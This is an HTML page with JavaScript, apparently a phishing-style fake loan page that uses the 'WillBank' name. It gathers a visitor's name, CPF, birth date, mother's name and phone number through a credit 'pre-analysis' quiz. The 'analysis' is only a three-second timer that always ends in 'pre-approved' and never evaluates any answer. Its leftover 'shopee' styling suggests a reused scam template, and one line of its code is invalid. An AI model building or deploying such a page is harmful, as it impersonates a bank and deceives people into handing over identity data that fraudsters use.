<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>WillBank - Pr√©-An√°lise</title>

  <!-- Tailwind -->
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="css/all.min.css">
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">

  <style>
    body { font-family:"Poppins",sans-serif; background-color:#f6f6f6; }
    .card { box-shadow:0 10px 25px rgba(0,0,0,0.05); border-radius:16px; transition:all .3s ease; }
    .btn-shine { position:relative; overflow:hidden; }
    .btn-shine:after { content:""; position:absolute; top:-50%; left:-50%; width:200%; height:200%;
      background:linear-gradient(to right,rgba(255,255,255,0)0%,rgba(255,255,255,.3)50%,rgba(255,255,255,0)100%);
      transform:rotate(30deg); animation:shine 4s infinite; }
    @keyframes shine { 0%{left:-100%;opacity:0;}10%{left:100%;opacity:.6;}100%{left:100%;opacity:0;} }
    .quiz-option { border:2px solid #e5e7eb; transition:all .3s; }
    .quiz-option:hover { border-color:#ffd900; background-color:#fffde6; }
    .quiz-option.selected { border-color:#ffd900; background-color:#fffde6; }
    .progress-container { width:100%; height:8px; background-color:#e5e7eb; border-radius:4px; margin-bottom:20px; }
    .progress-bar { height:100%; border-radius:4px; background:linear-gradient(90deg,#ffd900 0%,#cab600 100%); transition:width .5s ease; }
  </style>
</head>

<body class="bg-gray-50">

<script>
document.addEventListener("DOMContentLoaded", () => {
  // Pegar dados do localStorage ou da URL
  let dados = null;
  try {
    const local = localStorage.getItem("dadosUsuario");
    if (local) dados = JSON.parse(local);
  } catch (e) {}

  const params = new URLSearchParams(window.location.search);
  if ((!dados || !dados.cpf) && params.has("cpf")) {
    dados = {
      nome: params.get("nome"),
      cpf: params.get("cpf"),
      data_nascimento: params.get("data_nascimento"),
      sexo: params.get("sexo"),
      nome_mae: params.get("nome_mae")
    };
    localStorage.setItem("dadosUsuario", JSON.stringify(dados));
  }

  if (!dados || !dados.cpf) {
    console.warn("Nenhum dado v√°lido encontrado ‚Äî redirecionando...");
    window.location.href = "./index.html";
    return;
  }

  console.log("‚úÖ Dados carregados:", dados);
  document.querySelector("#nomeUsuario")?.innerText = dados.nome || "";
  document.querySelector("#cpfUsuario")?.innerText = dados.cpf || "";
});
</script>

<!-- ===================== CONTE√öDO PRINCIPAL ===================== -->
<div id="quizPage" class="max-w-md mx-auto min-h-screen flex flex-col relative bg-white page-transition">
  <div class="flex items-center p-4 border-b">
    <div class="flex items-center">
      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQtF4d5voZs-uursQomBUaKsPkTw8evy5PwsA&s" class="h-8">
      <span class="ml-2 text-xl font-bold text-shopee"></span>
    </div>
  </div>

  <div class="flex-1 p-6 flex flex-col">
    <h1 class="text-2xl font-bold text-gray-800 mb-2">Ol√°, <span id="nomeUsuario"></span> üëã</h1>
    <p class="text-gray-600 mb-6">Vamos iniciar sua pr√©-an√°lise de cr√©dito WillBank.</p>

    <div class="mb-6">
      <div class="flex justify-between mb-2">
        <span class="text-sm text-gray-600">Progresso</span>
        <span id="progressText" class="text-sm font-semibold text-shopee">1/8</span>
      </div>
      <div class="progress-container">
        <div id="progressBar" class="progress-bar" style="width:12%"></div>
      </div>
    </div>

    <!-- ===== Perguntas ===== -->
    <div id="quizContainer" class="flex-1">
      <div id="question1" class="quiz-question">
        <h2 class="text-xl font-bold text-gray-800 mb-4">Qual o valor que deseja solicitar?</h2>
        <div class="space-y-3">
          <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="500-1000">R$500 ‚Äì R$1.000</div>
          <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="1001-3000">R$1.001 ‚Äì R$3.000</div>
          <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="3001-5000">R$3.001 ‚Äì R$5.000</div>
          <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="acima5000">Acima de R$5.000</div>
        </div>
      </div>

      <div id="question2" class="quiz-question hidden">
        <h2 class="text-xl font-bold text-gray-800 mb-4">Possui renda fixa?</h2>
        <div class="space-y-3">
          <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="carteira">Carteira assinada</div>
          <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="autonomo">Aut√¥nomo</div>
          <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="semrenda">Sem renda</div>
        </div>
      </div>

      <div id="question3" class="quiz-question hidden">
        <h2 class="text-xl font-bold text-gray-800 mb-4">Seu nome est√° negativado?</h2>
        <div class="space-y-3">
          <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="sim">Sim</div>
          <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="nao">N√£o</div>
        </div>
      </div>

      <div id="question4" class="quiz-question hidden">
        <h2 class="text-xl font-bold text-gray-800 mb-4">J√° solicitou cr√©dito online?</h2>
        <div class="space-y-3">
          <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="sim">Sim</div>
          <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="nao">N√£o</div>
        </div>
      </div>

      <div id="question5" class="quiz-question hidden">
        <h2 class="text-xl font-bold text-gray-800 mb-4">Melhor dia de vencimento?</h2>
        <div class="space-y-3">
          <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="10">Dia 10</div>
          <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="15">Dia 15</div>
          <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="20">Dia 20</div>
          <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="25">Dia 25</div>
        </div>
      </div>

      <div id="question6" class="quiz-question hidden">
        <h2 class="text-xl font-bold text-gray-800 mb-4">Finalidade do cr√©dito?</h2>
        <div class="space-y-3">
          <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="pagar">Pagar contas</div>
          <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="negocio">Investir no neg√≥cio</div>
          <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="comprar">Comprar algo</div>
          <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="pessoal">Uso pessoal</div>
        </div>
      </div>

      <div id="question7" class="quiz-question hidden">
        <h2 class="text-xl font-bold text-gray-800 mb-4">Voc√™ tem cart√£o de cr√©dito?</h2>
        <div class="space-y-3">
          <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="sim">Sim</div>
          <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="nao">N√£o</div>
        </div>
      </div>

      <div id="question8" class="quiz-question hidden">
        <h2 class="text-xl font-bold text-gray-800 mb-4">Informe seu telefone para contato:</h2>
        <input type="tel" id="telefoneInput" placeholder="(00) 00000-0000"
          class="w-full border border-gray-300 rounded-xl p-4 focus:ring-2 focus:ring-shopee text-lg mb-4">
        <button id="btnEnviarTelefone"
          class="w-full bg-shopee hover:bg-shopee-dark text-white font-bold py-4 rounded-xl">Confirmar telefone</button>
      </div>

      <div id="analysisScreen" class="quiz-question hidden text-center py-10">
        <div class="animate-spin rounded-full h-20 w-20 border-b-4 border-shopee mx-auto mb-6"></div>
        <h2 class="text-xl font-bold text-gray-800 mb-3">Analisando seu perfil...</h2>
        <p class="text-gray-600">Isso pode levar alguns segundos</p>
      </div>

      <div id="quizResult" class="quiz-question hidden text-center py-10">
        <div class="bg-green-100 p-4 rounded-full inline-flex items-center justify-center mb-4">
          <i class="fas fa-check-circle text-green-500 text-4xl"></i>
        </div>
        <h2 class="text-2xl font-bold text-gray-800 mb-2">Pr√©-aprovado ‚úÖ</h2>
        <p class="text-gray-600 mb-6">Parab√©ns, <span id="nomeUsuarioResult"></span>! Seu cr√©dito foi pr√©-aprovado.
        </p>
      </div>
    </div>

    <div class="mt-auto">
      <button id="btnNext"
        class="w-full bg-shopee hover:bg-shopee-dark text-white text-lg font-bold py-4 rounded-xl btn-shine mt-6 hidden">
        Continuar
      </button>
    </div>
  </div>
</div>

<!-- ===================== SCRIPT QUIZ ===================== -->
<script>
document.addEventListener("DOMContentLoaded", function () {
  const totalQuestions = 8;
  let current = 1;
  let userAnswers = {};
  let telefone = "";

  const updateProgress = () => {
    const progress = (current / totalQuestions) * 100;
    document.getElementById("progressBar").style.width = `${progress}%`;
    document.getElementById("progressText").textContent = `${current}/${totalQuestions}`;
  };

  const next = () => {
    document.getElementById(`question${current}`).classList.add("hidden");
    current++;
    if (current <= totalQuestions) {
      document.getElementById(`question${current}`).classList.remove("hidden");
      updateProgress();
    } else {
      document.getElementById("analysisScreen").classList.remove("hidden");
      updateProgress();
      setTimeout(() => {
        document.getElementById("analysisScreen").classList.add("hidden");
        document.getElementById("quizResult").classList.remove("hidden");
        const dados = JSON.parse(localStorage.getItem("dadosUsuario") || "{}");
        document.getElementById("nomeUsuarioResult").textContent = dados.nome || "Usu√°rio";
      }, 3000);
    }
  };

  document.querySelectorAll(".quiz-option").forEach(opt => {
    opt.addEventListener("click", function () {
      userAnswers[current] = this.getAttribute("data-value");
      next();
    });
  });

  document.getElementById("btnEnviarTelefone").addEventListener("click", function () {
    telefone = document.getElementById("telefoneInput").value;
    const dados = JSON.parse(localStorage.getItem("dadosUsuario") || "{}");
    dados.telefone = telefone;
    localStorage.setItem("dadosUsuario", JSON.stringify(dados));
    next();
  });

  updateProgress();
});
</script>

</body>
</html>
